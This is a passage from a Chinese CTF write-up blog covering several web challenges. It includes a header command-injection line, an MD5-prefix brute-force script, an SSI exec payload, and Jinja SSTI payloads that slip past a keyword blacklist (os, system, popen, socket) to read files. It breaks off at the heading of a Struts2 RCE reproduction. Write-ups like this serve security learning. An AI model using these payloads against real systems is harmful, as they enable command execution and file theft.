&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;X-Forwarded-For:&amp;#123;system(‘cat /flag’)&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;BSidesCF-2019-Futurella&#34;&gt;&lt;a href=&#34;#BSidesCF-2019-Futurella&#34; class=&#34;headerlink&#34; title=&#34;[BSidesCF 2019]Futurella&#34;&gt;&lt;/a&gt;[BSidesCF 2019]Futurella&lt;/h1&gt;&lt;p&gt;额，F12就找到了&lt;/p&gt;
&lt;h1 id=&#34;BJDCTF2020-EasySearch&#34;&gt;&lt;a href=&#34;#BJDCTF2020-EasySearch&#34; class=&#34;headerlink&#34; title=&#34;[BJDCTF2020]EasySearch&#34;&gt;&lt;/a&gt;[BJDCTF2020]EasySearch&lt;/h1&gt;&lt;p&gt;扫描到了index.php.swp&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ob_start();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;get_hash&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable&#34;&gt;$chars&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;amp;*()+-&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable&#34;&gt;$random&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$chars&lt;/span&gt;[mt_rand(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;73&lt;/span&gt;)].&lt;span class=&#34;variable&#34;&gt;$chars&lt;/span&gt;[mt_rand(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;73&lt;/span&gt;)].&lt;span class=&#34;variable&#34;&gt;$chars&lt;/span&gt;[mt_rand(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;73&lt;/span&gt;)].&lt;span class=&#34;variable&#34;&gt;$chars&lt;/span&gt;[mt_rand(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;73&lt;/span&gt;)].&lt;span class=&#34;variable&#34;&gt;$chars&lt;/span&gt;[mt_rand(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;73&lt;/span&gt;)];&lt;span class=&#34;comment&#34;&gt;//Random 5 times&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt; = uniqid().&lt;span class=&#34;variable&#34;&gt;$random&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; sha1(&lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    header(&lt;span class=&#34;string&#34;&gt;&amp;quot;Content-Type: text/html;charset=utf-8&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	***&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;]) &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;] != &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$admin&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;6d0bc1&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;variable&#34;&gt;$admin&lt;/span&gt; == substr(md5(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;]),&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;[+] Welcome to manage system&amp;#x27;)&amp;lt;/script&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$file_shtml&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;public/&amp;quot;&lt;/span&gt;.get_hash().&lt;span class=&#34;string&#34;&gt;&amp;quot;.shtml&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$shtml&lt;/span&gt; = fopen(&lt;span class=&#34;variable&#34;&gt;$file_shtml&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;w&amp;quot;&lt;/span&gt;) &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Unable to open file!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$text&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            ***&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            ***&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            &amp;lt;h1&amp;gt;Hello,&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;].&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;            ***&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;			***&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fwrite(&lt;span class=&#34;variable&#34;&gt;$shtml&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$text&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            fclose(&lt;span class=&#34;variable&#34;&gt;$shtml&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            ***&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;[!] Header  error ...&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;[!] Failed&amp;#x27;)&amp;lt;/script&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	***&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	***&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里提示需要md5加密以后密码前6位是6d0bc1，这里直接用Python脚本跑&lt;/p&gt;
&lt;p&gt;脚本:&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; hashlib&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1000000000&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a = hashlib.md5(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(i).encode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)).hexdigest()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; a[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;] == &lt;span class=&#34;string&#34;&gt;&amp;#x27;6d0bc1&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(a)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;跑出来的结果如下 &lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211113150627198.png&#34; alt=&#34;image-20211113150627198&#34;&gt;&lt;/p&gt;
&lt;p&gt;登陆后抓包，会发现包里有一个Url_is_here，访问，这里是个SSI注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20211113141008144.png&#34; alt=&#34;image-20211113141008144&#34;&gt;&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!--#exec cmd=&amp;quot;ls ../&amp;quot;--&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;GYCTF2020-FlaskApp&#34;&gt;&lt;a href=&#34;#GYCTF2020-FlaskApp&#34; class=&#34;headerlink&#34; title=&#34;[GYCTF2020]FlaskApp&#34;&gt;&lt;/a&gt;[GYCTF2020]FlaskApp&lt;/h1&gt;&lt;p&gt;真的是太难了，提示失败乃成功之母，指的是Debug模式，则需利用Flask Debug模式&lt;/p&gt;
&lt;p&gt;在解密页面随便输，爆出源码&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@app.route(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;/decode&amp;#x27;&lt;/span&gt;,methods=[&lt;span class=&#34;string&#34;&gt;&amp;#x27;POST&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;GET&amp;#x27;&lt;/span&gt;]&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;decode&lt;/span&gt;():&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; request.values.get(&lt;span class=&#34;string&#34;&gt;&amp;#x27;text&amp;#x27;&lt;/span&gt;) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        text = request.values.get(&lt;span class=&#34;string&#34;&gt;&amp;quot;text&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        text_decode = base64.b64decode(text.encode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        tmp = &lt;span class=&#34;string&#34;&gt;&amp;quot;结果 ： &amp;#123;0&amp;#125;&amp;quot;&lt;/span&gt;.&lt;span class=&#34;built_in&#34;&gt;format&lt;/span&gt;(text_decode.decode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; waf(tmp) :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            flash(&lt;span class=&#34;string&#34;&gt;&amp;quot;no no no !!&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; redirect(url_for(&lt;span class=&#34;string&#34;&gt;&amp;#x27;decode&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        res =  render_template_string(tmp)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这里可以SSTI&lt;/p&gt;
&lt;p&gt;读源码:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&amp;#x27;catch_warnings&amp;#x27; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&amp;#x27;__builtins__&amp;#x27;].open(&amp;#x27;app.py&amp;#x27;,&amp;#x27;r&amp;#x27;).read() &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;waf函数发现了过滤,原来是flag和os等被过滤。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def waf(str):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    black_list = [&amp;amp;#34;flag&amp;amp;#34;,&amp;amp;#34;os&amp;amp;#34;,&amp;amp;#34;system&amp;amp;#34;,&amp;amp;#34;popen&amp;amp;#34;,&amp;amp;#34;import&amp;amp;#34;,&amp;amp;#34;eval&amp;amp;#34;,&amp;amp;#34;chr&amp;amp;#34;,&amp;amp;#34;request&amp;amp;#34;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                  &amp;amp;#34;subprocess&amp;amp;#34;,&amp;amp;#34;commands&amp;amp;#34;,&amp;amp;#34;socket&amp;amp;#34;,&amp;amp;#34;hex&amp;amp;#34;,&amp;amp;#34;base64&amp;amp;#34;,&amp;amp;#34;*&amp;amp;#34;,&amp;amp;#34;?&amp;amp;#34;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    for x in black_list :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if x in str.lower() :&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            return 1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;利用字符串拼接找目录,发现了this_is_the_flag.txt&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;#123;&amp;#x27;&amp;#x27;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&amp;#x27;__builtins__&amp;#x27;][&amp;#x27;__imp&amp;#x27;+&amp;#x27;ort__&amp;#x27;](&amp;#x27;o&amp;#x27;+&amp;#x27;s&amp;#x27;).listdir(&amp;#x27;/&amp;#x27;)&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#IHt7JycuX19jbGFzc19fLl9fYmFzZXNfX1swXS5fX3N1YmNsYXNzZXNfXygpWzc1XS5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ11bJ19faW1wJysnb3J0X18nXSgnbycrJ3MnKS5saXN0ZGlyKCcvJyl9fQ==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;读取使用切片省去了拼接flag的步骤&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&amp;#x27;catch_warnings&amp;#x27; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&amp;#x27;__builtins__&amp;#x27;].open(&amp;#x27;txt.galf_eht_si_siht/&amp;#x27;[::-1],&amp;#x27;r&amp;#x27;).read() &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#eyUgZm9yIGMgaW4gW10uX19jbGFzc19fLl9fYmFzZV9fLl9fc3ViY2xhc3Nlc19fKCkgJX17JSBpZiBjLl9fbmFtZV9fPT0nY2F0Y2hfd2FybmluZ3MnICV9e3sgYy5fX2luaXRfXy5fX2dsb2JhbHNfX1snX19idWlsdGluc19fJ10ub3BlbigndHh0LmdhbGZfZWh0X3NpX3NpaHQvJ1s6Oi0xXSwncicpLnJlYWQoKSB9fXslIGVuZGlmICV9eyUgZW5kZm9yICV9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

 &lt;h1 id=&#34;Struts2-013RCE漏洞复现-CVE-2013-1966&#34;&gt;&lt;a href=&#34;#Struts2-013RCE漏洞复现-CVE-2013-1966&#34; class=&#34;headerlink&#34; title=&#34;Struts2-013RCE漏洞复现(CVE-2013-1966)&#34;&gt;&lt;/a&gt;Struts2-013RCE漏洞复现(CVE-2013-1966)&lt;/h1&gt;&lt;h1 id=&#34;影响版本&#34;&gt;&lt;a href=&#34;#影响版本&#34; class=&#34;headerlink&#34; title=&#34;影响版本&#34;&gt;&lt;/a&gt;&lt;strong&gt;影响版本&lt;/strong&gt;&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Apache Group Struts 2.0.0 - 2.3.14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

